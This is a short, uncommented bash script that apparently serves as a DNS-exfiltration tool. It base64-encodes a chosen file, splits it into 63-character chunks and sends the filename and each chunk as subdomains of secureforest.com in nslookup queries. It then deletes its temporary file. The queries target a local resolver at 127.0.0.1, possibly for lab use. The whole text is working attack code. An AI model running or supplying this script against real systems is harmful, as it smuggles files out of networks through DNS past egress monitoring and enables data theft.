#!/bin/bash
base64 -i $1 | sed 's/=//' | fold -w63 > tmpdata
filename=$(basename -- "$1" | base64 | sed 's/=//')
nslookup "$filename.fsub.secureforest.com" 127.0.0.1
echo "$filename.fsub.secureforest.com"
while IFS= read -r line; do
  nslookup "$line.dsub.secureforest.com" 127.0.0.1
done < tmpdata
rm -rf tmpdata
